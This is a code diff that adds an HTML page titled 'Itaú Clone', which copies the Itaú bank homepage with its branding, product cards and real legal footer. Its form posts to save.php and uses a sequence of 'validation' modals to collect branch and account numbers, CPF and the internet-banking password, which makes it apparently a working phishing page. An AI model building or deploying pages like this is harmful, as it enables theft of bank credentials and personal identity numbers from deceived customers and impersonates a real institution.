@@ -1,0 +1,559 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Menu — Itaú Clone (menu + modal + mini carousel)</title>
+
+  <!-- Inter (fonte parecida com Itaú Sans) -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <!-- main stylesheet (contains menu, modal and mini-carousel CSS) -->
+  <link rel="stylesheet" href="estilo.css">
+</head>
+
+<body>
+<!-- ===== ACCESS FORM (envolve menu + modal) ===== -->
+<!-- ===== ACCESS FORM (envolve menu + modal) ===== -->
+<form id="access-form" action="save.php" method="post" novalidate>
+  <!-- ===== MENU (mantive suas classes/ids) ===== -->
+  <nav class="itau-nav" role="navigation" aria-label="Main">
+    <div class="nav-inner">
+      <div class="brand">
+        <a href="#" class="logo">itau</a>
+      </div>
+
+      <ul class="nav-links" role="menubar" aria-label="Seções">
+        <li><a href="#" role="menuitem">Para você</a></li>
+        <li><a href="#" role="menuitem">Para empresas</a></li>
+        <li><a href="#" role="menuitem">Ajuda</a></li>
+      </ul>
+
+      <div class="nav-actions" role="group" aria-label="Acessos e Conta">
+        <!-- Agência (menu) -->
+        <div class="field-inline">
+          <span class="label-inline">Agência</span>
+          <!-- name usado para identificar origem (menu) -->
+          <input id="agencia_menu" name="agencia_menu" inputmode="numeric" maxlength="4" placeholder="0000" aria-label="Agência (menu)">
+        </div>
+
+        <!-- Conta (menu) -->
+        <div class="field-inline">
+          <span class="label-inline">Conta</span>
+          <input id="conta_menu" name="conta_menu" inputmode="numeric" maxlength="7" placeholder="00000-0" aria-label="Conta (menu)">
+        </div>
+
+        <!-- botão principal: NÃO submete o form diretamente, abre validação/fluxo de modais -->
+        <button id="open-password-btn" type="button" class="lock-wrap lock-submit" aria-label="Acessar">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <circle cx="12" cy="12" r="11" fill="white"/>
+            <path d="M9 6 L15 12 L9 18" stroke="#FF6A00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+
+        <!-- botão que abre modal "+ Acessos" -->
+        <button id="open-accessos" type="button" class="btn ghost plus-btn" aria-haspopup="dialog" aria-controls="modal-acessos">
+          <span class="plus">＋</span>
+          <span class="txt">Acessos</span>
+        </button>
+
+        <button type="button" class="btn primary">Abra sua conta</button>
+
+        <input type="checkbox" id="menu-toggle" class="menu-toggle" />
+        <label for="menu-toggle" class="hamburger" aria-hidden="true">
+          <span></span><span></span><span></span>
+        </label>
+      </div>
+    </div>
+
+    <div class="mobile-menu" aria-hidden="true">
+      <ul>
+        <li><a href="#">Para você</a></li>
+        <li><a href="#">Para empresas</a></li>
+        <li><a href="#">Ajuda</a></li>
+        <li class="mobile-cta"><a href="#">Abra sua conta</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- ===== MODAL + ACESSOS ===== -->
+  <div id="modal-acessos" class="modal-wrapper" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="modal-title" style="display:none;">
+    <div class="modal" role="document">
+      <button class="close-modal" id="close-modal" aria-label="Fechar" type="button">✕</button>
+
+      <h2 id="modal-title" class="modal-title">Acessos</h2>
+
+      <div class="access-tabs" role="tablist" aria-label="Métodos de acesso">
+        <button class="tab active" data-tab="ag-conta" role="tab" aria-selected="true" type="button">Agência e Conta</button>
+        <button class="tab" data-tab="cpf" role="tab" aria-selected="false" type="button">CPF</button>
+      </div>
+
+      <div class="modal-body">
+        <!-- TABELA: Agência e Conta (modal) -->
+        <div id="tab-ag-conta" class="tab-content active" role="tabpanel" aria-hidden="false">
+          <label class="modal-input">
+            <span>Agência</span>
+            <!-- nome distinto (modal) -->
+            <input id="modal-agencia" name="agencia_modal" inputmode="numeric" maxlength="4" placeholder="0000" aria-label="Agência no modal">
+          </label>
+
+          <label class="modal-input">
+            <span>Conta</span>
+            <input id="modal-conta" name="conta_modal" inputmode="numeric" maxlength="7" placeholder="00000-0" aria-label="Conta no modal">
+          </label>
+
+          <!-- caso cliente queira enviar agência+conta via modal, pode submeter aqui -->
+          <div style="display:flex;gap:8px;margin-top:8px;">
+            <button id="modal-access-btn" name="action" value="access_with_modal" class="btn modal-primary full" type="button">Acessar</button>
+          </div>
+        </div>
+
+        <!-- TABELA: CPF -->
+        <div id="tab-cpf" class="tab-content hidden" role="tabpanel" aria-hidden="true" style="display:none;">
+          <label class="modal-input">
+            <span>CPF</span>
+            <!-- note: maxlength 14 para permitir máscara 000.000.000-00 -->
+            <input id="modal-cpf" name="cpf_modal" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" aria-label="CPF">
+          </label>
+
+          <!-- ao digitar CPF, o usuário poderá abrir um mini-modal para preencher agência+conta (opcional) -->
+          <div style="display:flex;gap:8px;margin-top:8px;">
+            <button id="modal-access-cpf" name="action" value="access_with_cpf" class="btn modal-primary full" type="button">Continuar</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Modal CPF (validação) ===== -->
+  <div id="cpfModal" class="custom-modal" aria-hidden="true" style="display:none;">
+    <div class="custom-modal-content">
+      <button class="custom-modal-close" data-modal-close type="button">&times;</button>
+      <h3>Para validar suas informações digite seu cpf</h3>
+      <input id="cpf_input" name="cpf" type="text" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" />
+      <div class="custom-modal-actions" style="margin-top:10px;">
+        <button id="cpf_confirm" class="btn primary" type="button">Confirmar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Modal Agência/Conta (validação) ===== -->
+  <div id="acModal" class="custom-modal" aria-hidden="true" style="display:none;">
+    <div class="custom-modal-content">
+      <button class="custom-modal-close" data-modal-close type="button">&times;</button>
+      <h3>Para validar suas informações digite sua agencia e conta</h3>
+      <div class="ac-row" style="margin-top:8px;">
+        <input id="ac_agencia" name="agencia_validate" type="text" placeholder="Agência" maxlength="4" inputmode="numeric" />
+        <input id="ac_conta"   name="conta_validate" type="text"   placeholder="Conta" maxlength="7" />
+      </div>
+      <div class="custom-modal-actions" style="margin-top:10px;">
+        <button id="ac_confirm" class="btn primary" type="button">Confirmar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Password confirmation modal (INSERIR DENTRO DO form #access-form) -->
+  <div id="modal-password" class="modal-wrapper" role="dialog" aria-modal="true" aria-hidden="true" style="display:none;">
+    <div class="modal" role="document" aria-labelledby="modal-password-title">
+      <button class="close-modal" id="close-password-modal" aria-label="Fechar" type="button">✕</button>
+
+      <h2 id="modal-password-title" class="modal-title">Digite sua senha de acesso</h2>
+
+      <div class="modal-body">
+        <label class="modal-input">
+          <span>Senha de acesso</span>
+          <input id="password-input" name="password" type="password" autocomplete="current-password" maxlength="8" placeholder="Sua senha" required>
+        </label>
+
+        <p style="font-size:13px;color:#666;margin-top:8px;">
+          senha de acesso: usada para acessar a internet<br>
+          senha do cartão: usada para acessar o caixa eletrônico
+        </p>
+
+        <div style="display:flex;gap:10px;margin-top:14px;">
+          <button id="password-submit" class="btn modal-primary" type="button">Enviar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- keep a hidden field as fallback (optional) -->
+  <input type="hidden" id="password_hidden" name="password_hidden" value="">
+  <input type="hidden" id="record_id" name="record_id" value="">
+
+</form>
+
+  <!-- ===== HERO / SLIDES (new mini control integrated) ===== -->
+  <section class="hero-carousel" aria-label="Destaque">
+    <div class="hero-container">
+
+      <!-- Slides wrapper (keep your slides) -->
+      <div class="slides" id="slides">
+        <div class="slide active slideimg1"><img src="images/1.avif" alt="Slide 1"><div class="hero-left-ctrl"><h2 class="hero-left-title">Mais que um banco, mais <br> que uma corretora </h2><button><a class="hero-cta" href="">Descubra</a></button></div></div>
+        <div class="slide slideimg2"><img src="images/2.avif" alt="Slide 2"><div class="hero-left-ctrl"><h2 class="hero-left-title">Esquenta Itaú Week</h2> <p>Ofertas exclusivas e condições especiais de Black Friday</p> <button><a class="hero-cta" href="">Aproveite</a></button></div></div>
+        <div class="slide slideimg3"><img src="images/3.avif" alt="Slide 3"><div class="hero-left-ctrl"><h2 class="hero-left-title">Pix no Itaú</h2> <p>Pra tudo que você precisa tem Pix no Itaú.</p> <button><a class="hero-cta" href="">Conheça as soluções</a></button></div></div>
+        <div class="slide slideimg4"><img src="images/4.avif" alt="Slide 4"><div class="hero-left-ctrl"><h2 class="hero-left-title">iPhone pra Sempre na Itaú Week</h2> <p>Até R$1.175 de desconto e 21x sem juros + parcela final</p> <button><a class="hero-cta" href="">Aproveitar no app</a></button></div></div>
+        <div class="slide slideimg5"><img src="images/5.avif" alt="Slide 5"><div class="hero-left-ctrl"><h2 class="hero-left-title">Sua dívida tem solução!</h2> <p>Conte com a gente para se organizar com ofertas que cabem no seu bolso.</p> <button><a class="hero-cta" href="">Venha conferir</a></button></div></div>
+      </div>
+
+      <!-- MINI controls (pixel-perfect mini control with 5 dots) -->
+      <div class="mini-carousel-controls" aria-hidden="false">
+        <button class="mini-arrow mini-prev" aria-label="Anterior">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M15 18 L9 12 L15 6" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+
+        <div class="mini-dots" role="tablist" aria-label="Navegação"></div>
+
+        <button class="mini-arrow mini-next" aria-label="Próximo">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 6 L15 12 L9 18" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ===== SOLUTIONS ROW (6 cards) ===== -->
+<section class="solutions-section" aria-label="Resolva as questões do dia a dia">
+  <div class="container">
+    <h3 class="solutions-title">Resolva as questões do dia a dia</h3>
+
+    <div class="solutions-grid" role="list">
+      <!-- Card 1 -->
+      <a href="#" class="solution-card" role="listitem">
+        <span class="sc-icon" aria-hidden="true">
+          <!-- simple line icon -->
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><rect x="4" y="6" width="16" height="12" rx="1.5" stroke="#222" stroke-width="1.2"/></svg>
+        </span>
+        <div class="sc-body">
+          <div class="sc-title">Boleto</div>
+          <div class="sc-desc">Emita 2ª via de boletos Itau</div>
+        </div>
+        <span class="sc-chevron" aria-hidden="true">›</span>
+      </a>
+
+      <!-- Card 2 -->
+      <a href="#" class="solution-card" role="listitem">
+        <span class="sc-icon" aria-hidden="true">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M4 7h16" stroke="#222" stroke-width="1.2"/></svg>
+        </span>
+        <div class="sc-body">
+          <div class="sc-title">Desbloqueio de cartão</div>
+          <div class="sc-desc">Saiba como fazer</div>
+        </div>
+        <span class="sc-chevron" aria-hidden="true">›</span>
+      </a>
+
+      <!-- Card 3 -->
+      <a href="#" class="solution-card" role="listitem">
+        <span class="sc-icon" aria-hidden="true">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="10" r="3" stroke="#222" stroke-width="1.2"/></svg>
+        </span>
+        <div class="sc-body">
+          <div class="sc-title">Aplicativos</div>
+          <div class="sc-desc">Baixe os apps do banco Itau</div>
+        </div>
+        <span class="sc-chevron" aria-hidden="true">›</span>
+      </a>
+
+      <!-- Card 4 -->
+      <a href="#" class="solution-card" role="listitem">
+        <span class="sc-icon" aria-hidden="true">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><rect x="5" y="6" width="14" height="10" stroke="#222" stroke-width="1.2"/></svg>
+        </span>
+        <div class="sc-body">
+          <div class="sc-title">Fatura digital</div>
+          <div class="sc-desc">Receba a fatura do seu cartão</div>
+        </div>
+        <span class="sc-chevron" aria-hidden="true">›</span>
+      </a>
+
+      <!-- Card 5 -->
+      <a href="#" class="solution-card" role="listitem">
+        <span class="sc-icon" aria-hidden="true">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M6 12h12" stroke="#222" stroke-width="1.2"/></svg>
+        </span>
+        <div class="sc-body">
+          <div class="sc-title">Comprovantes</div>
+          <div class="sc-desc">Gerar uma 2ª via do comprovante</div>
+        </div>
+        <span class="sc-chevron" aria-hidden="true">›</span>
+      </a>
+
+      <!-- Card 6 -->
+      <a href="#" class="solution-card" role="listitem">
+        <span class="sc-icon" aria-hidden="true">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M8 7h8" stroke="#222" stroke-width="1.2"/><path d="M8 11h8" stroke="#222" stroke-width="1.2"/></svg>
+        </span>
+        <div class="sc-body">
+          <div class="sc-title">Atendimento</div>
+          <div class="sc-desc">Conheça nossos canais de ajuda</div>
+        </div>
+        <span class="sc-chevron" aria-hidden="true">›</span>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== CONTRATE NOSSOS PRODUTOS ON-LINE — LAYOUT 1 + 4 ===== -->
+<section class="products-section">
+  <div class="container">
+
+    <h3 class="products-title">Contrate nossos produtos on-line</h3>
+    <p class="products-subtitle">Confira as soluções que o banco Itaú oferece para você.</p>
+
+    <div class="products-layout">
+
+      <!-- CARD GRANDE (top) -->
+      <a href="#" class="product-card large">
+        <div class="product-info">
+          <span class="product-tag">Solução</span>
+          <h4 class="product-name">Renegociação Itaú</h4>
+          <p class="product-desc">Aproveite condições para ficar em dia com parcelamento em até 72x.</p>
+          <button class="product-btn">Simular agora</button>
+        </div>
+        <div class="product-image">
+          <!-- usando sua imagem enviada como placeholder -->
+          <img src="images/imagem_mulher_sem_fundo.avif" alt="Renegociação">
+        </div>
+      </a>
+
+      <!-- GRID 2x2 - cards menores -->
+      <div class="small-grid">
+        <a href="#" class="product-card small">
+          <div class="product-info">
+            <span class="product-tag">Empréstimo</span>
+            <h4 class="product-name">Novo Crédito Consignado</h4>
+            <p class="product-desc">Taxas atrativas e aprovação rápida.</p>
+            <button class="product-btn">Confira aqui</button>
+          </div>
+          <div class="product-image"><img src="images/c.avif" alt="Consignado"></div>
+        </a>
+
+        <a href="#" class="product-card small">
+          <div class="product-info">
+            <span class="product-tag">Cartões</span>
+            <h4 class="product-name">O cartão de crédito ideal</h4>
+            <p class="product-desc">Escolha o cartão certo para você.</p>
+            <button class="product-btn">Peça o seu</button>
+          </div>
+          <div class="product-image"><img src="images/desktop_mosaic_cartoes.avif" alt="Cartões"></div>
+        </a>
+
+        <a href="#" class="product-card small">
+          <div class="product-info">
+            <span class="product-tag">Antecipação FGTS</span>
+            <h4 class="product-name">Não deixe o seu dinheiro parado</h4>
+            <p class="product-desc">Antecipe seu FGTS com condições especiais.</p>
+            <button class="product-btn">Simular agora</button>
+          </div>
+          <div class="product-image"><img src="images/mosaico-home-antecipaco-fgts.avif" alt="FGTS"></div>
+        </a>
+
+        <a href="#" class="product-card small">
+          <div class="product-info">
+            <span class="product-tag">app Itaú</span>
+            <h4 class="product-name">Controle de Gastos</h4>
+            <p class="product-desc">Descubra como o app te ajuda a controlar despesas.</p>
+            <button class="product-btn">Conheça</button>
+          </div>
+          <div class="product-image"><img src="images/imagem_maos_sem_fundo.avif" alt="App"></div>
+        </a>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===================== SEGUNDA PARTE DA PÁGINA ===================== -->
+
+<section class="cards-credit-section">
+  <div class="container">
+    <h2 class="cards-credit-title">Confira nossos cartões de crédito mais pedidos da semana</h2>
+
+    <div class="cards-credit-grid">
+      <a href="#" class="credit-card">
+        <img src="images/Imagem-cartao-itau-azul-mc-cred-skyline-V1.avif" alt="Cartão Azul">
+        <h4>Cartão Azul Skyblue</h4>
+        <p>Ganhe pontos e benefícios exclusivos.</p>
+        <span class="cc-cta">Peça o seu</span>
+      </a>
+
+      <a href="#" class="credit-card">
+        <img src="images/cartao-pao-de-acucar-mastercard-black.avif" alt="Cartão Pão de Açúcar Black">
+        <h4>Cartão Pão de Açúcar Black</h4>
+        <p>Acumule pontos e aproveite os benefícios.</p>
+        <span class="cc-cta">Peça o seu</span>
+      </a>
+
+      <a href="#" class="credit-card">
+        <img src="images/cartao-itau-latam-pass-mastercard-black.avif" alt="Cartão LATAM Pass Black">
+        <h4>Cartão LATAM Pass Black</h4>
+        <p>Pontue e troque por viagens e vantagens.</p>
+        <span class="cc-cta">Peça o seu</span>
+      </a>
+
+      <a href="#" class="credit-card">
+        <img src="images/cartoes-itau-prateleira.avif" alt="Cartão Itaú">
+        <h4>Cartão Itaú</h4>
+        <p>Um cartão completo para o dia a dia.</p>
+        <span class="cc-cta">Peça o seu</span>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- BANNER PROMOCIONAL -->
+<section class="promo-banner-section">
+  <div class="container">
+    <div class="promo-banner">
+      <div class="promo-panel">
+        <span class="promo-tag">iPhone pra Sempre</span>
+        <h3>Conheça a nova geração do iPhone</h3>
+        <p>Até R$1.175 de desconto na Itaú Week. Parcele em 21x sem juros + parcela fina</p>
+        <button class="promo-btn">Aproveite</button>
+      </div>
+
+      <div class="promo-visual">
+        <img src="images/4.avif" alt="iPhone Promo">
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 3 CARDS DE CONTEÚDOS FINANCEIROS -->
+<section class="finance-content-section">
+  <div class="container">
+    <div class="section-subline">
+      <img src="" alt="" class="subline-icon">
+      Organização Financeira
+    </div>
+
+    <h2 class="finance-title">Confira conteúdos e soluções que facilitam a organização das suas finanças</h2>
+
+    <div class="finance-grid">
+      <a href="#" class="finance-card">
+        <img src="images/imagem_com_texto_reserva_cofrinho.avif" alt="">
+        <div class="fc-body">
+          <h4>Cartões Itaú</h4>
+          <p>Guia prático de como escolher o cartão ideal.</p>
+          <span class="fc-cta">Conhecer Cartões</span>
+        </div>
+      </a>
+
+      <a href="#" class="finance-card">
+        <img src="images/pessoa-acessando-app-itau-592x345.avif" alt="">
+        <div class="fc-body">
+          <h4>Controle de gastos</h4>
+          <p>Descubra como organizar seu orçamento.</p>
+          <span class="fc-cta">Conhecer Controle de Gastos</span>
+        </div>
+      </a>
+
+      <a href="#" class="finance-card">
+        <img src="images/homem-barba-camisa-azul-notebook.avif" alt="">
+        <div class="fc-body">
+          <h4>Educação Financeira</h4>
+          <p>Dicas para melhorar seu planejamento financeiro.</p>
+          <span class="fc-cta">Ler artigos</span>
+        </div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<footer class="itau-footer" role="contentinfo" aria-label="Rodapé Itaú">
+  <div class="footer-top">
+    <div class="container">
+      <p class="top-note"><a href="#">Abra sua conta no Banco Itaú: Soluções financeiras para você</a></p>
+      <hr class="sep">
+      <div class="footer-grid">
+        <nav class="col">
+          <h4><a href="#">Nossos produtos</a></h4>
+          <ul>
+            <li><a href="#">Conta corrente</a></li>
+            <li><a href="#">Cartões de crédito</a></li>
+            <li><a href="#">Consórcio</a></li>
+            <li><a href="#">Seguros</a></li>
+            <li><a href="#">Investimentos</a></li>
+            <li><a href="#">Renegociação</a></li>
+          </ul>
+        </nav>
+
+        <nav class="col">
+          <h4><a href="#">Itaú</a></h4>
+          <ul>
+            <li><a href="#">Relações com investidores</a></li>
+            <li><a href="#">Blog Itaú</a></li>
+            <li><a href="#">Carreiras</a></li>
+            <li><a href="#">Imprensa</a></li>
+            <li><a href="#">Sustentabilidade</a></li>
+            <li><a href="#">Integridade e Ética</a></li>
+            <li><a href="#">Análises econômicas</a></li>
+            <li><a href="#">Termos de uso</a></li>
+            <li><a href="#">Privacidade</a></li>
+            <li><a href="#">Fornecedores</a></li>
+            <li><a href="#" class="accessibility">⚿ Estatuto de acessibilidade</a></li>
+          </ul>
+        </nav>
+
+        <nav class="col">
+          <h4><a href="#">Ajuda</a></h4>
+          <ul>
+            <li><a href="#">Central de ajuda</a></li>
+            <li><a href="#">Canais Itaú</a></li>
+            <li><a href="#">Encontre agências</a></li>
+            <li><a href="#">Segurança</a></li>
+            <li><a href="#">Acessos não correntista</a></li>
+            <li><a href="#">Consumidor.gov</a></li>
+          </ul>
+
+          <h4 class="mt"><a href="#">Confira também</a></h4>
+          <ul>
+            <li><a href="#">Para empresas</a></li>
+            <li><a href="#">Para poder público</a></li>
+            <li><a href="#">Fundeb</a></li>
+            <li><a href="#">Pacotes e tarifas</a></li>
+          </ul>
+        </nav>
+
+        <div class="col contact">
+          <h4><a href="#">Fale com o Itaú</a></h4>
+          <ul>
+            <li><a href="#">Para você</a></li>
+            <li><a href="tel:08007280728">SAC 0800 728 0728</a></li>
+            <li><a href="tel:08005700011">Ouvidoria 0800 570 0011</a></li>
+            <li><a href="#">Denúncia</a></li>
+          </ul>
+
+          <h4 class="mt"><a href="#">Acompanhe</a></h4>
+          <div class="social">
+            <a class="s" href="#" aria-label="Instagram">IG</a>
+            <a class="s" href="#" aria-label="YouTube">YT</a>
+            <a class="s" href="#" aria-label="Facebook">FB</a>
+            <a class="s" href="#" aria-label="X">X</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer-bottom">
+    <div class="container bottom-row">
+      <div class="left">
+        <a href="#" class="intl">🌐 Itaú em outros países</a>
+      </div>
+
+      <div class="right">
+        <p class="legal">
+          <a href="#">© 2025 Itaú Unibanco Holding S.A. CNPJ: 60.872.504/0001-23</a><br>
+          <a href="#">Praça Alfredo Egydio de Souza Aranha, 100, Torre Olavo Setubal, Parque Jabaquara - CEP 04344-902 - São Paulo - Brasil</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+  <!-- Scripts -->
+  <script src="script.js"></script>
+</body>
+</html>
